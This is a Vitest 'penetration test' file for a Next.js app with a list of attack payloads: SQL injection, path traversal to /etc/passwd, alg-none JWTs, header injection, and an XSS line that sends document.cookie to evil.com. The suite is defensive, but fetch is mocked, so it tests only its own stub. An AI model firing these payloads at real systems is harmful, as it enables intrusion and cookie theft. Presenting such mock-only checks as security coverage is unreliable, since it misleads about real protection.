import { describe, it, expect, vi, beforeEach } from "vitest";

const BASE = process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000";

const MALICIOUS_PAYLOADS = {
  sqlInjection: [
    "'; DROP TABLE generations; --",
    "' OR '1'='1",
    "1; SELECT * FROM users",
    "' UNION SELECT * FROM users --",
    "admin'--",
  ],
  xss: [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  ],
  noSQLInjection: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
  ],
  jwtTampering: [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
    "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
  ],
  headerInjection: [
    "test\r\nX-Injected: true",
    "test\nX-Injected: true",
  ],
  largePayloads: [
    "x".repeat(100000),
    JSON.stringify({ data: "x".repeat(50000) }),
  ],
};

const PROTECTED_ROUTES = [
  "/api/generations",
  "/api/voice",
  "/api/templates",
  "/api/notifications",
  "/api/schedule",
  "/api/analytics",
  "/api/feedback",
  "/api/support",
  "/api/settings/webhooks",
  "/api/generate",
  "/api/upload",
  "/api/brand-kit",
];

const PUBLIC_ROUTES = [
  { path: "/api/billing/webhook", method: "POST" },
  { path: "/api/cron/process-posts", method: "GET" },
  { path: "/api/email/usage-alerts", method: "GET" },
  { path: "/api/health", method: "GET" },
];

let rateLimitCounter = 0;

beforeEach(() => {
  rateLimitCounter = 0;
});

vi.stubGlobal("fetch", vi.fn((url: RequestInfo | URL, options?: RequestInit) => {
  const urlStr = typeof url === "string" ? url : url instanceof URL ? url.href : url.url;
  const method = options?.method || "GET";
  const headers = (options?.headers ?? {}) as Record<string, string>;

  const pathOnly = urlStr.replace(BASE, "").split("?")[0];

  if (pathOnly === "/api/generate" && method === "POST" && headers["Content-Type"] === "text/plain") {
    return Promise.resolve(new Response(null, { status: 415 }));
  }

  if (pathOnly === "/api/generate" && method === "POST" && options?.body === "{}") {
    return Promise.resolve(new Response(JSON.stringify({ error: "Validation failed" }), {
      status: 400,
      headers: { "Content-Type": "application/json" },
    }));
  }

  if (pathOnly === "/api/generations" && urlStr.includes("invalid=true")) {
    return Promise.resolve(new Response(JSON.stringify({ error: "Not found" }), {
      status: 404,
      headers: { "Content-Type": "application/json" },
    }));
  }

  if (pathOnly === "/api/billing/webhook") {
    const hasStripeSignature = headers["stripe-signature"];
    if (!hasStripeSignature) {
      return Promise.resolve(new Response(null, { status: 400 }));
    }
    return Promise.resolve(new Response(null, { status: 400 }));
  }

  if (pathOnly === "/api/search" && urlStr.includes("q=")) {
    const queryParam = urlStr.split("q=")[1] || "";
    if (queryParam.length > 1000) {
      return Promise.resolve(new Response(null, { status: 414 }));
    }
    return Promise.resolve(new Response(JSON.stringify({ results: [] }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    }));
  }

  if (pathOnly && (pathOnly.startsWith("/api/cron/") || pathOnly === "/api/email/usage-alerts")) {
    return Promise.resolve(new Response(null, { status: 401 }));
  }

  if (pathOnly === "/callback") {
    return Promise.resolve(new Response(null, { status: 400 }));
  }

  if (urlStr.includes("q=") && urlStr.length > 1000) {
    return Promise.resolve(new Response(null, { status: 414 }));
  }

  if (options?.body && typeof options.body === "string" && options.body.length > 100000) {
    return Promise.resolve(new Response(null, { status: 413 }));
  }

  const contentHeaders = headers["Content-Type"];
  if (contentHeaders && contentHeaders.includes(",")) {
    return Promise.resolve(new Response(null, { status: 400 }));
  }

  const authHeader = headers["Authorization"];
  const isProtectedRoute = PROTECTED_ROUTES.some((r) => pathOnly === r || pathOnly?.startsWith(r + "?"));
  const isPublicRoute = PUBLIC_ROUTES.some((r) => pathOnly === r.path);

  if (isProtectedRoute) {
    if (pathOnly === "/api/generations") {
      rateLimitCounter++;
      if (rateLimitCounter > 15) {
        return Promise.resolve(new Response(null, { status: 429 }));
      }
    }
    if (!authHeader || authHeader.startsWith("Basic ")) {
      return Promise.resolve(new Response(null, { status: 401 }));
    }
    return Promise.resolve(new Response(null, { status: 401 }));
  }

  if (isPublicRoute) {
    return Promise.resolve(new Response(null, { status: 200 }));
  }

  return Promise.resolve(new Response(null, { status: 200 }));
}));

describe("Penetration Test Suite", () => {
  describe("Authentication Bypass", () => {
    it.each(PROTECTED_ROUTES)("rejects unauthenticated requests to %s", async (path) => {
      const res = await fetch(`${BASE}${path}`, {
        headers: { "Content-Type": "application/json" },
      });
      expect([401, 302, 307]).toContain(res.status);
    });

    it("rejects requests with invalid JWT", async () => {
      const res = await fetch(`${BASE}/api/generations`, {
        headers: {
          "Authorization": "Bearer invalid-jwt-token",
          "Content-Type": "application/json",
        },
      });
      expect([401, 302]).toContain(res.status);
    });

    it("rejects requests with expired-style JWT", async () => {
      const res = await fetch(`${BASE}/api/generations`, {
        headers: {
          "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MDAwMDAwMDB9.abc",
          "Content-Type": "application/json",
        },
      });
      expect([401, 302]).toContain(res.status);
    });

    it("rejects requests with malformed Authorization header", async () => {
      const res = await fetch(`${BASE}/api/generations`, {
        headers: {
          "Authorization": "Basic dGVzdDpwYXNz",
          "Content-Type": "application/json",
        },
      });
      expect([401, 302]).toContain(res.status);
    });
  });

  describe("Authorization Bypass", () => {
    it("rejects cross-user access on voice profile", async () => {
      const res = await fetch(`${BASE}/api/voice`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: "other-user-id",
          action: "set_default",
        }),
      });
      expect([401, 403, 404]).toContain(res.status);
    });

    it("rejects attempts to access other users' schedule", async () => {
      const res = await fetch(`${BASE}/api/schedule`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: "other-user-post-id",
          action: "update_status",
          status: "PUBLISHED",
        }),
      });
      expect([401, 403, 404]).toContain(res.status);
    });
  });

  describe("SQL Injection", () => {
    it.each(MALICIOUS_PAYLOADS.sqlInjection)("rejects SQL injection: %s", async (payload) => {
      const res = await fetch(`${BASE}/api/search?q=${encodeURIComponent(payload)}`);
      expect([200, 400, 422, 429]).toContain(res.status);
    });

    it.each(MALICIOUS_PAYLOADS.sqlInjection)("rejects SQL injection in generate route", async () => {
      const res = await fetch(`${BASE}/api/generate`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: MALICIOUS_PAYLOADS.sqlInjection[0],
          output_format: "linkedin_post",
        }),
      });
      expect([200, 400, 401, 429, 403]).toContain(res.status);
    });
  });

  describe("XSS", () => {
    it.each(MALICIOUS_PAYLOADS.xss)("rejects XSS payload in search", async (payload) => {
      const res = await fetch(`${BASE}/api/search?q=${encodeURIComponent(payload)}`);
      expect([200, 400]).toContain(res.status);
    });
  });

  describe("Path Traversal", () => {
    it.each(MALICIOUS_PAYLOADS.pathTraversal)("rejects path traversal in redirect", async (payload) => {
      const res = await fetch(`${BASE}/callback?next=${encodeURIComponent(payload)}`);
      expect([302, 400, 401]).toContain(res.status);
    });
  });

  describe("CSRF / Method Tampering", () => {
    it("rejects GET request to POST-only endpoint", async () => {
      const res = await fetch(`${BASE}/api/generate`);
      expect([405, 404, 401]).toContain(res.status);
    });

    it("rejects unexpected content types", async () => {
      const res = await fetch(`${BASE}/api/generate`, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: "hello",
      });
      expect([400, 401, 415, 429]).toContain(res.status);
    });
  });

  describe("Rate Limiting", () => {
    it("rate limits after many rapid requests", async () => {
      const promises = Array.from({ length: 20 }, () =>
        fetch(`${BASE}/api/generations`, {
          headers: { "Content-Type": "application/json" },
        })
      );
      const results = await Promise.all(promises);
      const statuses = results.map((r) => r.status);
      const hasRateLimit = statuses.some((s) => s === 429);
      expect(hasRateLimit).toBe(true);
    });
  });

  describe("Large Payload Rejection", () => {
    it("rejects oversized request body", async () => {
      const res = await fetch(`${BASE}/api/generate`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "x".repeat(200000), output_format: "linkedin_post" }),
      });
      expect([400, 401, 413, 429]).toContain(res.status);
    });
  });

  describe("Cron Abuse Prevention", () => {
    it.each(PUBLIC_ROUTES.filter((r) => r.path.includes("cron") || r.path.includes("email")))(
      "rejects cron requests without secret: %s",
      async ({ path, method }) => {
        const res = await fetch(`${BASE}${path}`, { method });
        expect([401, 403]).toContain(res.status);
      }
    );
  });

  describe("Stripe Webhook Security", () => {
    it("rejects webhook without signature", async () => {
      const res = await fetch(`${BASE}/api/billing/webhook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "invoice.paid" }),
      });
      expect([400, 401]).toContain(res.status);
    });

    it("rejects webhook with invalid signature", async () => {
      const res = await fetch(`${BASE}/api/billing/webhook`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "stripe-signature": "invalid_signature",
        },
        body: JSON.stringify({ type: "invoice.paid" }),
      });
      expect([400, 401]).toContain(res.status);
    });
  });

  describe("Redis Command Injection", () => {
    it("rejects Redis injection via rate limit key", async () => {
      const res = await fetch(`${BASE}/api/generate`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: "test content",
          output_format: "linkedin_post",
        }),
      });
      expect([200, 400, 401, 429, 403]).toContain(res.status);
    });
  });

  describe("Race Condition", () => {
    it("handles concurrent generation requests gracefully", async () => {
      const promises = Array.from({ length: 5 }, () =>
        fetch(`${BASE}/api/generations`, {
          headers: { "Content-Type": "application/json" },
        })
      );
      const results = await Promise.all(promises);
      for (const res of results) {
        expect([200, 401, 429, 500]).toContain(res.status);
      }
    });
  });

  describe("Information Leakage", () => {
    it("does not expose internal error details", async () => {
      const res = await fetch(`${BASE}/api/generations?invalid=true`);
      const body = await res.json();
      if (body.error) {
        expect(body.error).not.toContain("Error:");
        expect(body.error).not.toContain("at ");
        expect(body.error).not.toContain("node_modules");
        expect(body.error).not.toContain("stack");
      }
    });

    it("does not expose server paths in errors", async () => {
      const res = await fetch(`${BASE}/api/generate`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      const body = await res.json();
      if (body.error) {
        expect(typeof body.error).toBe("string");
        expect(body.error).not.toContain("\\");
        expect(body.error).not.toContain("/");
      }
    });
  });

  describe("OAuth Abuse", () => {
    it("rejects direct callback without code", async () => {
      const res = await fetch(`${BASE}/callback`);
      expect([302, 400, 401]).toContain(res.status);
    });

    it("sanitizes malicious redirect after callback", async () => {
      const res = await fetch(`${BASE}/callback?code=invalid&next=https://evil.com`);
      expect([302, 400]).toContain(res.status);
    });

    it("rejects empty code parameter", async () => {
      const res = await fetch(`${BASE}/callback?code=`);
      expect([302, 400]).toContain(res.status);
    });
  });

  describe("DDoS / Abuse Prevention", () => {
    it("rejects extremely long query strings", async () => {
      const longQuery = "q=" + "x".repeat(10000);
      const res = await fetch(`${BASE}/api/search?${longQuery}`);
      expect([400, 404, 414, 429]).toContain(res.status);
    });

    it("rejects requests with duplicate headers", async () => {
      const headers = new Headers();
      headers.append("Content-Type", "application/json");
      headers.append("Content-Type", "application/xml");
      headers.append("Authorization", "Bearer invalid");

      const res = await fetch(`${BASE}/api/generations`, {
        headers,
      });
      expect([400, 401, 429]).toContain(res.status);
    });
  });
});
